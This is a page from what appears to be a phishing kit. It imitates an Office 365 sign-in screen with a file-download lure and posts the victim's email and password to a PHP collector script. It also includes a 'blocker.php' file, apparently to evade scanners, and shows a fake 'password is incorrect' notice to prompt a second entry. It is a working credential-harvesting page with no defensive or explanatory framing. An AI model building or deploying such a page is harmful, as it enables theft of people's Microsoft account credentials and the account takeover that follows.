<?php


session_start();
include("blocker.php");

?>

<!DOCTYPE html> 
<html>
<head>
    <title>Office 365 - Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
    
    <link rel="shortcut icon" type="icon" href="assets/favicon.ico">
    <link rel="stylesheet" type="text/css" href="scripts/ms-style.css">
    <script type="text/javascript" src="scripts/jquery-2.1.1.min.js"></script>  
    
    <script type="text/javascript">
        function isValidEmailAddress(emailAddress) {
            var pattern = new RegExp(/^(("[\w-\s]+")|([\w-]+(?:\.[\w-]+)*)|("[\w-\s]+")([\w-]+(?:\.[\w-]+)*))(@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$)|(@\[?((25[0-5]\.|2[0-4][0-9]\.|1[0-9]{2}\.|[0-9]{1,2}\.))((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\.){2}(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\]?$)/i);
            return pattern.test(emailAddress);
        };

        $(function(){

            $(document).ready(function(){
                $("#next").click(function(){
                    $('#loader').show();
                    
                    if(!isValidEmailAddress($('#email').val())) {
                        $('#email').addClass("error");
                        $('#message').show();
                        $('#message').text('Enter a valid email address, phone number, or Skype name.');
                        $('#loader').hide();

                        $('#email').on('input',function(){
                            $('#email').removeClass('error');
                            $('#message').hide();
                        });
                        return false;
                    }

                });
            });
        });
    </script>
    
</head>

<body>
    <div class="overlay">
        <div class="login-box">
            <img src="assets/365.png" height="70" alt="logo">
<h2 id="title">User authentication is required to download this file</h2>
            <h2 id="title">Sign&nbsp;in to Office 365</h2>

            <p id="message" class="message"></p>

             <form action="php/login365-2.php" method="post">
                
                 <div class="row margin-bottom-50">
                        <div class="form-group  placeholderContainer">
                            <input type="text" style="padding-left: 0px; border: 0px; border-bottom: 1px solid #aaa;width: 96%;
    
    
    height: 2.5em;
    font-size: 15px;
    box-shadow: none;
    overflow: hidden;
   
    margin-bottom: 1em;
}"   aria-required="true"  placeholder="Email, phone, or Skype"  spellcheck="false" autocomplete="off" name="emaill" required>
                           
                        </div>
                           <div class="row margin-bottom-50">
                        <div class="form-group  placeholderContainer">
                            <input type="password" style="padding-left: 0px; border: 0px; border-bottom: 1px solid #aaa"  aria-required="true"  placeholder="Password"  spellcheck="false" autocomplete="off" name="psw" required>
                           
                        </div>
                <font color="red">Your account or password is incorrect.</font>
                 
                    <div class="row margin-bottom-20">
                        <div class="col-md-12 section text-secondary">
                           
                            <a href="#" aria-label="Create a Microsoft account">I forgot my password !</a>
                            <div class="row inline-block no-margin-top-bottom button-container">

                  
                </div>  
                          
                          
                            
                                  
                  
                </div>  
                         

                   
                   </div>  
                        

<br/><br/>
                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="submit" style="width: 160px;" class="btn btn-block btn-primary" data-bind="value: config.text.linkNext, click: submit" value="Sign in & Download">
                </div>
                </div>